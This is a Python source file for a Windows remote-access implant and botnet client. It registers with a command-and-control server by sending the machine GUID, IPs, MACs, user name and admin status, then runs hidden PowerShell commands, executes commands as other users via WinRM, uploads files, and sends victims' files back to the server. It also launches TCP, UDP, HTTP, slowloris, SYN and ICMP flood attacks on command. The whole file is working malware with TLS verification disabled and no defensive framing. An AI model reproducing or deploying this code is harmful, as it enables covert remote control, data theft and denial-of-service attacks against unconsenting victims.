import asyncio
import json
import shlex
import subprocess
import signal
import sys
import os
import base64
import socket
import random
import threading
import time
import re
import winrm
import ssl
from websockets import connect
from websockets.exceptions import ConnectionClosedError, ConnectionClosedOK
from typing import List, Dict, Tuple, Optional
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)


class Impl:
    def __init__(self, c2_ws_url: str, group: str = "aaaaaa", sess_key: str = ""):
            self.c2_ws_url = c2_ws_url
            self.group = group
            self.sess_key = sess_key
            self.current_dir = os.getcwd()
            self.upload_buffer = []
            self.upload_destination = None
            self.running = True
            self.attack_thread = None
            self.attacks = []
            self.retry_count = 0
            self.max_retry_delay = 300  

    async def run(self) -> None:
        
        while self.running:
            try:
                
                await self.register()
                await self._connect_to_c2()
                
                self.retry_count = 0
                
            except ConnectionClosedOK:
                await self._wait_before_retry()
                
            except (ConnectionClosedError, ConnectionRefusedError, TimeoutError) as e:
                await self._wait_before_retry()
                
            except Exception as e:
                await self._wait_before_retry()

    async def _wait_before_retry(self):
        self.retry_count += 1
        
        delay = min(5 * (2 ** (self.retry_count - 1)), self.max_retry_delay)
        await asyncio.sleep(delay)

    
    async def _connect_to_c2(self) -> None:
        try:
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            async with connect(
                f"wss://{self.c2_ws_url}/api/rcv?id={self.impl_id}-root={self._get_root()}-user={self._get_user()}&sess_key={self.sess_key}".lower(),
                ping_interval=20,
                ping_timeout=10,
                close_timeout=10,
                open_timeout=30,
                ssl=ssl_context  
            ) as ws:
                self.retry_count = 0  


                while self.running:
                    try:
                        await self._handle_commands(ws)
                    except ConnectionClosedError:
                        raise
                    except Exception as e:
                        await asyncio.sleep(1)
                        
        except Exception as e:
            raise
        


    async def _handle_commands(self, ws) -> None:
        try:
            
            cmd = await asyncio.wait_for(ws.recv(), timeout=60)
            data = json.loads(cmd)
                                            
            if 'cmd' in data:
                await self._execute_command(ws, data['cmd'])
            elif 'chunk' in data:
                await self._handle_file_upload(ws, data)
            elif 'list_files' in data:
                await self._list_directory(ws, data.get('path', self.current_dir))
            elif "Invalid conection" in data:
                sys.exit(0)
            elif "Invalid conection" in data:
                sys.exit(0)
            elif 'get_files' in data:
                await self._send_file(ws, data['get_files'])
            elif 'attack' in data:
                await self._handle_attack_command(ws, data)
            elif 'stop_attack' in data:
                await self._stop_attack(ws, attack_type=data['stop_attack'])
            elif 'finish' in data:
                await self._exit(ws)

        except asyncio.TimeoutError:
            
            pass
        except ConnectionClosedError:
            raise
        except Exception as e:
            try:
                await ws.send(json.dumps({"result": f"Error: {str(e)}"}))
            except:
                pass  

    async def _execute_command(self, ws, command: str):


        command = command.strip()

        if command.startswith("cd "):
            await self._change_directory(ws, command[3:].strip())
            return

        elif command.startswith("runas"):
            await ws.send(json.dumps({
                "result": "Runas command is not properly. Use: 'exec_as <user> <password> <host (localhost by default)> <command>' instead.",
                "cwd": self.current_dir
            }))
        elif command.startswith("exec_as"):

            try:
                result = await self._execute_as_user(command[8:].strip())
                output = result.replace("\r", "").rstrip()   
                await ws.send(json.dumps({
                    "result": output,
                    "cwd": self.current_dir
                }, ensure_ascii=False))

            except Exception as e:
                pass
                

        else:
            out, err, _ = self._execute_shell_command(command)
            output = out if out else err

            if not isinstance(output, str):
                output = str(output)
                
            output = output.replace("\r", "").rstrip()   
            await ws.send(json.dumps({
                "result": output,
                "cwd": self.current_dir
            }, ensure_ascii=False))




    async def _execute_as_user(self, command_with_credentials: str):
        try:
            parts = shlex.split(command_with_credentials)

            username = parts[0]
            password = parts[1]
            actual_command = parts[2:]


            domain = os.environ.get("USERDOMAIN", "WORKGROUP")

            result = await self.execute_command_as_user(actual_command, username, domain, password)

            return result
       
        except Exception as e:
            
            return f"Errorr: {e}"
        


    async def execute_command_as_user(self, command, username, domain, password):
        try:
            run_in_background =  command[-1] == "&"

            if run_in_background:
                command.remove("&")



            return await self._execute_winrm_command(
                command, username, domain, password, "localhost", 
                run_in_background
            )


        except Exception as ex:
            return f"Error executing command: {str(ex)}"


    async def _execute_winrm_command(self, command: str, username: str, domain: str, 
                                   password: str, host: str, run_in_background: bool,
                                   output_file: Optional[str] = None, 
                                   append: bool = False) -> str:
        """
        Ejecuta el comando a través de WinRM con todas las funcionalidades
        """
        try:

            session = winrm.Session(
                host,
                auth=(f"{domain}\\{username}", password),
                transport='ntlm'
            )
            
            if run_in_background:
                
                try:
                    bg_command = f' {' '.join(f'{arg}' for arg in command)}'
                    
                    bg_command = f'Start-Process {bg_command} -WindowStyle Hidden -PassThru'

                    result = session.run_ps(bg_command)

                    

                    if result.status_code == 0:
                        pid_match = re.search(r'Id\s*:\s*(\d+)', result.std_out.decode('utf-8'))
                        if pid_match:
                            return f"Process {pid_match.group(1)} started in background."
                        return "Process started in background."
                    else:
                        error = result.std_err.decode('utf-8', errors='ignore')
                        return f"ERROR starting background process: {error}"
                except Exception as e:
                    pass
            
            else:

                try:

                    result = session.run_ps(' '.join(f'{arg}' for arg in command))
                    
                    output = result.std_out.decode('utf-8', errors='ignore')
                    error = result.std_err.decode('utf-8', errors='ignore')
                    
                    final_output = ""
                    if result.status_code != 0:
                        final_output = f"ERROR: {error}"
                    else:
                        final_output = output
                    
                except Exception as e:
                    pass
                if output_file:
                    try:
                        mode = 'a' if append else 'w'
                        encoding = 'utf-8'
                        
                        if output_file:
                            if append:
                                append_cmd = f'Add-Content -Path "{output_file}" -Value @\"\n{final_output}\n\"@'
                            else:
                                append_cmd = f'Set-Content -Path "{output_file}" -Value @\"\n{final_output}\n\"@'
                            
                            file_result = session.run_ps(append_cmd)
                            if file_result.status_code == 0:
                                final_output = f"Output redirected to {output_file}"
                            else:
                                file_error = file_result.std_err.decode('utf-8', errors='ignore')
                                final_output = f"Error redirecting output: {file_error}"
                    
                    except Exception as file_ex:
                        final_output = f"Error handling file redirection: {str(file_ex)}"
                
                return final_output
                
        except Exception as ex:
            return f"WinRM execution error: {str(ex)}"

    
    async def _change_directory(self, ws, path: str) -> None:
       
        path = path.replace('"', '')
        if path == "..":
            self.current_dir = os.path.dirname(self.current_dir)
        else:
            new_path = os.path.abspath(os.path.join(self.current_dir, path))
            if os.path.isdir(new_path):
                self.current_dir = new_path
            else:
                await ws.send(json.dumps({
                    "error": f"El directorio '{path}' no existe.",
                    "cwd": self.current_dir
                }))
                return
        
        await ws.send(json.dumps({
            "result": "",
            "error": "",
            "cwd": self.current_dir
        }))
    
    def _execute_shell_command(self, command: str) -> Tuple[str, str, str]:
       
        escaped_cmd = command.replace('"', '"')
        result = subprocess.run(
            ['powershell.exe', '-Command', f'Set-Location "{self.current_dir}"; {escaped_cmd}'],
            capture_output=True, 
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return result.stdout, result.stderr, self.current_dir
    
    async def _handle_file_upload(self, ws, data: Dict) -> None:
       
        try:
            part = base64.b64decode(data['chunk']['data'])
            is_last = data['chunk'].get('last', False)
            
            self.upload_buffer.append(part)
            
            if self.upload_destination is None:
                self.upload_destination = data['destination']
            
            if is_last:
                with open(self.upload_destination, "wb") as f:
                    for chunk in self.upload_buffer:
                        f.write(chunk)
                
                self.upload_buffer.clear()
                self.upload_destination = None
                
                await ws.send(json.dumps({
                    "status": "upload_complete",
                    "message": f"Archivo recibido en {self.upload_destination}"
                }))
        
        except Exception as e:
            await ws.send(json.dumps({
                "status": "error",
                "message": str(e)
            }))
    
    async def _list_directory(self, ws, path: str) -> None:
       
        if not os.path.exists(path):
            await ws.send(json.dumps({
                "error": f"Ruta no encontrada: {path}"
            }))
            return
        
        items = []
        try:
            for name in os.listdir(path):
                full_path = os.path.join(path, name)
                item_type = "directory" if os.path.isdir(full_path) else "file"
                items.append({
                    "name": name,
                    "type": item_type,
                    "size": os.path.getsize(full_path) if item_type == "file" else 0
                })
            
            await ws.send(json.dumps({
                "items": items,
                "path": path,
                "status": "success"
            }))
        
        except Exception as e:
            await ws.send(json.dumps({
                "error": str(e),
                "status": "error"
            }))
    
    async def _send_file(self, ws, file_path:str) -> None:

        if file_path.startswith("//"):
            file_path=file_path.replace("//","/")


        if not os.path.isfile(file_path):
            await ws.send(json.dumps({
                "error": f"Archivo no encontrado: {file_path}",
                "status": "error"
            }))
            return

        CHUNK_SIZE = 64 * 1024
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break

                    encoded = base64.b64encode(chunk).decode("utf-8")
                    is_last = f.tell() == os.path.getsize(file_path)

                    await ws.send(json.dumps({
                        "filename": os.path.basename(file_path),
                        "path": file_path,
                        "chunk": encoded,
                        "last": is_last
                    }))
                    
                    await asyncio.sleep(0)  

        except Exception as e:
            await ws.send(json.dumps({
                "error": str(e),
                "status": "error"
            }))
    
    async def _handle_attack_command(self, ws, data: Dict) -> None:

        stop_thread = threading.Event()
        attack_type = data['attack']['type']
        target = data['attack']['target']
        duration = data['attack'].get('duration', 60)

        if len(self.attacks) == 0:
            
            loop = asyncio.get_event_loop()
            
            attack_thread = threading.Thread(
                target=self._execute_attack,
                args=(str(attack_type), str(target), int(duration), ws, loop, stop_thread),
                daemon=True
            )
            attack_thread.start()

            self.attacks.append({"type":attack_type, "thread": attack_thread, "stop_thread":stop_thread, "target":target, "loop":loop})

            
            await ws.send(json.dumps({
                "status": "attack_running",
                "attack_type": attack_type,
                "target": target
            }))
        else:
            for attack in self.attacks:
                if attack_type == attack['type']:
                    next
                else:
                    loop = asyncio.get_event_loop()
                    
                    attack_thread = threading.Thread(
                        target=self._execute_attack,
                        args=(str(attack_type), str(target), int(duration), ws, loop, stop_thread),
                        daemon=True
                    )
                    attack_thread.start()

                    self.attacks.append({"type":attack_type, "thread": attack_thread, "stop_thread":stop_thread, "target":target, "loop":loop})

                    await ws.send(json.dumps({
                        "status": "attack_running",
                        "attack_type": attack_type,
                        "target": target
                    }))

                return
    
    def _execute_attack(self, attack_type: str, target: str, duration: int, ws, loop, stop_thread) -> None:

       
        end_time = time.time() + duration
        
        try:
            if attack_type == "tcp_flood":
                self._tcp_flood_attack(target, end_time, stop_thread)
            elif attack_type == "udp_flood":
                self._udp_flood_attack(target, end_time, stop_thread)
            elif attack_type == "http_flood":
                self._http_flood_attack(target, end_time, stop_thread)
            elif attack_type == "slowloris":
                self._slowloris_attack(target, end_time, stop_thread)
            elif attack_type == "syn_flood":
                self._syn_flood_attack(target, end_time, stop_thread)
            elif attack_type == "icmp_flood":
                self._icmp_flood_attack(target, end_time, stop_thread)
            else:
                next
        except Exception as e:
            next
        finally:
            asyncio.run_coroutine_threadsafe(
                self._notify_attack_completed(ws, attack_type, target),
                loop
            )

    async def _notify_attack_completed(self, ws, attack_type: str, target: str) -> None:
       
        try:
            await ws.send(json.dumps({
                "status": "attack_completed",
                "attack_type": attack_type,
                "target": target,
                "message": "Attack completed"
            }))
        except Exception as e:
            next


    
    def _tcp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
       
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and not stop_thread.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, target_port))
                s.send(random._urandom(1024))
                s.close()

            except:
                pass
    
    def _udp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
       
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and not stop_thread.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (target_ip, target_port))
                s.close()

            except:
                pass
    
    def _http_flood_attack(self, target: str, end_time: float, stop_thread) -> None:

        import urllib.request
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target  
        
        socket.setdefaulttimeout(5)  
        
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': '*/*',
            'Connection': 'close'  
        }
        
        
        request = urllib.request.Request(
            url=target,
            headers=headers,
            method='GET'
        )
        
        while time.time() < end_time and not stop_thread.is_set():
            try:
                with urllib.request.urlopen(request) as response:
                    response.read(64)  
                time.sleep(0.01)
            except urllib.error.URLError as e:
                break
            except Exception as e:
                time.sleep(1)  
        
    
    def _slowloris_attack(self, target: str, end_time: float, stop_thread) -> None:
       
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        sockets = []
        
        try:
            while time.time() < end_time and not stop_thread.is_set(): 
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_ip, target_port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                    sockets.append(s)
                except:
                    self._close_sockets(sockets)
                    sockets = []
                
                for s in sockets:
                    try:
                        s.send("X-a: b\r\n".encode())
                    except:
                        sockets.remove(s)
                
                time.sleep(15)
        finally:
            self._close_sockets(sockets)
    

    def _syn_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and not stop_thread.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                packet = b'\x00' * 64  
                s.sendto(packet, (target_ip, target_port))
                s.close()
            except:
                pass
    
    def _icmp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
        import os
        while time.time() < end_time and not stop_thread.is_set():
            try:
                if os.name == 'nt':
                    os.system(f"ping -n 1 -l 65500 {target} > nul")
            except:
                pass


    def _close_sockets(self, sockets: list) -> None:
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    async def _stop_attack(self, ws, attack_type) -> None:

        if len(attack_type) == 0:
            for attack in self.attacks[:]:
                
                attack['stop_thread'].set()
                attack['thread'].join(timeout=5)
                asyncio.run_coroutine_threadsafe(
                    self._notify_attack_completed(ws, attack_type, attack['target']),
                    attack['loop']
                )
                self.attacks.remove(attack)

        else:
            for attack in self.attacks:
                if attack['type'] == attack_type:
                    if attack['thread'].is_alive():
                        attack['stop_thread'].set()
                        attack['thread'].join(timeout=5)
                    self.attacks.remove(attack)
                    asyncio.run_coroutine_threadsafe(
                        self._notify_attack_completed(ws, attack_type, attack['target']),
                        attack['loop']
                    )

    
    async def _exit(self, ws):
        
        await ws.close()
        sys.exit(0)

    
    async def register(self) -> bool:
        
            model = {
                'impl_mac': self._get_macs(),
                'group': self.group,
                'public_ip': self._get_public_ip(),
                'local_ip': self._get_local_ips(),
                'operating_system': self._get_operating_system(),
                'impl_id': f"{self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
                'root': self._get_root(),
                'user': self._get_user(),
                'sess_key': self.sess_key
            }

            session = requests.Session()
            session.mount('https://', SSLAdapter())

            max_attempts = 3

            for attempt in range(max_attempts):
                if attempt < max_attempts - 1:
                    await asyncio.sleep(1)
                try:
                    req = session.post(
                        f"https://{self.c2_ws_url}/api/impl/new/{model['impl_id']}".lower(),
                        data=model,
                        timeout=10,
                        verify=False 
                    )

                    if "Invalid session key" in req.content():
                        sys.exit(0)
                    if req.status_code == 200:
                        return True
                    else:
                        return False
                except Exception as e:

                    return False 
            
            return False
        
        

    @property
    def impl_id(self) -> str:
       
        output, _, _ = self._execute_shell_command(
            "(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -Name MachineGuid).MachineGuid"
        )
        return str(output).replace('\\n', '').strip()
    
    def _get_macs(self) -> List[str]:
       
        macs_output, err, _ = self._execute_shell_command(
            "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress"
        )
        return [mac.replace("\n", "").replace("\r", "") for mac in macs_output.splitlines()] if macs_output else ['undefined']
    
    def _get_local_ips(self) -> List[str]:
        ips_output, err, _ = self._execute_shell_command(
            "Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne 'localhost' } | Select-Object -ExpandProperty IPAddress"
        )
        return [ip.replace("\n", "").replace("\r", "") for ip in ips_output.splitlines()] if ips_output else ['undefined']
    
    def _get_public_ip(self) -> str:
       
        ip_output, err, _ = self._execute_shell_command('Invoke-RestMethod -Uri "https://api.ipify.org"')
        return ip_output.strip() if ip_output else "undefined"
    
    def _get_operating_system(self) -> str:
       
        sysop, err, _ = self._execute_shell_command('(Get-CimInstance Win32_OperatingSystem).Caption')
        return sysop.strip() if sysop else "undefined"
    
    def _get_root(self) -> bool:
        isAdmin, err, _ = self._execute_shell_command('([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)')
        if isAdmin.strip() == "True":
            return True
        else:
            return False

    def _get_user(self) -> str:
        user, err, _ = self._execute_shell_command('whoami')
        return user.strip() if user else "undefined"


if __name__ == "__main__":

    C2_WS_URL = "localhost:443"
    GROUP_NAME = "grupo"
    SESS_KEY = "1234567"
    

    
    impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME, sess_key=SESS_KEY)
    
    def signal_handler(sig, frame):
        impl.running = False
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        asyncio.run(impl.run())
    except KeyboardInterrupt:
        impl.running = False
    except Exception as e:
        raise       